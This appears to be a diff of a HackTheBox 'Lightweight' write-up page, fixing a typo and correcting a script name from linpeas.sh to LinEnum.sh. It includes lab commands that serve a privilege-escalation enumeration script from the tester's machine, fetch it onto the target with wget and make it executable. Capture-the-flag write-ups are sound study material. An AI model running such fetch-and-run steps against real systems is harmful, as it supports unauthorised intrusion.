@@ -1,4 +1,4 @@
-I"z3<h1 id="introductionlightweight">Introduction@Lightweight:~$</h1>
+I"{3<h1 id="introductionlightweight">Introduction@Lightweight:~$</h1>
 
 <table>
   <thead>
@@ -55,7 +55,7 @@
 
 <p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
 
-<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+<p>Download link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
 
 <hr />
 <p><img src="/assets/img/lightweight-hackthebox/nmap-automator-1.png" alt="" /></p>
@@ -240,11 +240,11 @@
 <hr />
 <p><img src="/assets/img/lightweight-hackthebox/downloading-linenum-ldapuser1-26.png" alt="" /></p>
 
-<p><strong>Command</strong>: <em>wget http://10.10.14.14:8081/linpeas.sh</em></p>
+<p><strong>Command</strong>: <em>wget http://10.10.14.14:8081/LinEnum.sh</em></p>
 
 <p><strong>Command</strong>: <em>python3 -m http.server 8081</em></p>
 
-<p>Ran LinEnum.sh after giving executing permissions using <em>chmod +x linpeas.sh</em> and found this</p>
+<p>Ran LinEnum.sh after giving executing permissions using <em>chmod +x LinEnum.sh</em> and found this</p>
 
 <hr />
 <p><img src="/assets/img/lightweight-hackthebox/posix-capabilities-27.png" alt="" /></p>
